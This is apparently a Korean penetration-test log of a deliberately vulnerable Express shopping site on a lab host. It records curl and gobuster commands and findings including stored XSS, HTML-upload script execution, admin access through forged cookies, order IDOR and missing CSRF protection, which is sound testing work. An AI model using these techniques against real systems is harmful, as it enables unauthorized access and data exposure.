## 환경 설정
- 대상: http://10.210.136.53:3000
- `X-Forwarded-For` 헤더에 사용할 테스트 IP: 192.168.64.7
- 규칙: 모든 HTTP 요청에 헤더 포함, DoS 금지.

## 탐색 및 공격 로그
- `curl -i /` (필수 헤더 포함): Express 기반 쇼핑 랜딩 페이지, 제품 그리드만 노출. 보안 토글 `v1`.
- `curl -i /board`: 누구나 작성 가능한 Q&A 게시판, HTML 주석에 “Unescaped output allows XSS” 명시. 기존 `<script>alert('XSS')</script>` 게시물이 그대로 렌더링됨(저장형 XSS).
- `curl -i /login`, `/signup`: 일반 로그인/가입 폼, CSRF 토큰 없음.
- 디렉터리 브루트포스 (`gobuster dir -u http://10.210.136.53:3000 -w /usr/share/wordlists/dirb/common.txt -H "X-Forwarded-For: 192.168.64.7"`): `/board`, `/login`, `/signup`, `/logout`(302), `/order`(302→/login), `/profile`(302→/login), `/images`, `/uploads` 발견.
- 저장형 XSS 검증: `curl -i -H X-Forwarded-For ... -d "content=<script>alert('pwn')</script>" /board` → 302 후 페이지에서 스크립트가 그대로 노출/실행.
- 가입/로그인 흐름: `pentester`/`Passw0rd!` 생성 및 로그인 시 쿠키 `user`, `user_id`, `isAdmin` 설정(클라이언트 측 조작 가능).
- 프로필 페이지: 인증 후 `profile_image` 업로드 폼 존재.
- 업로드 악용: `curl -b cookie.txt -F "profile_image=@script/payload.html" /profile/upload` 성공, `/uploads/payload.html`이 `text/html`로 서빙되며 `<script>alert('upload-test')</script>` 실행(공개 접근 가능).
- 인증 우회/권한 상승: 수동 쿠키 설정(`user=admin; user_id=1; isAdmin=true`) 후 `/profile` 요청 → 관리자 내비게이션 표시. `/admin/products`, `/admin/users` 완전 접근 가능(제품 수정/유저 삭제/전체 목록 조회)하며 자격 증명 불필요.
- 기존 `/uploads/test.html`에서 `<script>alert(1)</script>` 동작 확인 → 업로드 제한 없음.
- 주문 IDOR: 조작 쿠키(`user=guest; user_id=2; isAdmin=false`)로 `/order` 접근 시 ORDER #2 노출, `/order?id=2`에서 주문/배송 정보 표시. 쿠키 변조 외 별도 권한 체크 없음; HTML 주석에 “IDOR Link Construction” 표기.
- 업로드 파일명에 `filename=../traverse.html` 시도해도 `/uploads/traverse.html`로 저장됨(디렉터리 탈출 차단 없지만 임의 HTML 저장 허용, MIME 검사 없음).
- CSRF 부재: 모든 폼(로그인/가입/게시글/프로필 업로드/관리자 폼)에서 토큰 없음, 기본 쿠키에 의존 → 타 사이트에서 요청 강제 가능(쿠키 변조와 결합 시 위험 증폭).
- 안전하지 않은 쿠키: 로그인 응답의 `user`, `user_id`, `isAdmin`에 `HttpOnly/Secure/SameSite` 미설정 → XSS·CSRF 시 세션 탈취 용이.
- 로그인 엔드포인트가 자동 계정 생성: 신규 username으로 `/login` POST 시 302와 함께 쿠키 발급(사전 가입 검증 없음) → 가입 흐름·검증 우회.
